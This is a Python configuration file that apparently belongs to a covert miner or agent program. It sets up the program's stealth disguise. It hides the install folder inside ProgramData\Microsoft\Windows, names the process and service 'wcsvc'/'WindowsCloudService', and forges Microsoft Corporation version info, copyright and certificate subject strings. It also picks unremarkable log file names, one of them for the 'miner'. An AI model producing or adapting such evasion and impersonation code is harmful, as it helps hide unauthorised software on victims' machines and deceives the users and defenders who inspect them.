"""Stealth configuration: every visible trace looks like a Windows system service."""

# Installation path: deep inside ProgramData\Microsoft (never browsed by users)
INSTALL_DIR_NAME = "wcsvc"                    # "Windows Cloud Service"
INSTALL_DIR_PARENT = None                     # resolved at runtime: %ProgramData%\Microsoft\Windows

# Process name (what appears in Task Manager)
PROCESS_NAME = "wcsvc.exe"

# Scheduled task / registry key / service name
SERVICE_NAME = "WindowsCloudService"

# Version info (what shows in file Properties)
COMPANY = "Microsoft Corporation"
PRODUCT = "Windows Cloud Service"
DESCRIPTION = "Windows Cloud Service Runtime"
COPYRIGHT = "(c) Microsoft Corporation. All rights reserved."

# Certificate subject
CERT_SUBJECT = "CN=Windows Cloud Service,O=Microsoft Corporation,C=US"

# Log file names (boring)
LOG_AGENT = "wcsvc.log"
LOG_MINER = "wcsvc-runtime.log"
LOG_CRASH = "wcsvc-error.log"
LOG_INSTALL = "wcsvc-setup.log"

# Config file
CONFIG_FILE = "wcsvc.dat"

# Bundles directory
BUNDLES_DIR = "wcsvc-cache"

def get_install_dir():
    """C:\\ProgramData\\Microsoft\\Windows\\wcsvc"""
    import os
    base = os.environ.get("ProgramData", os.path.join(os.environ.get("SystemDrive", "C:"), "\\ProgramData"))
    return os.path.join(base, "Microsoft", "Windows", INSTALL_DIR_NAME)
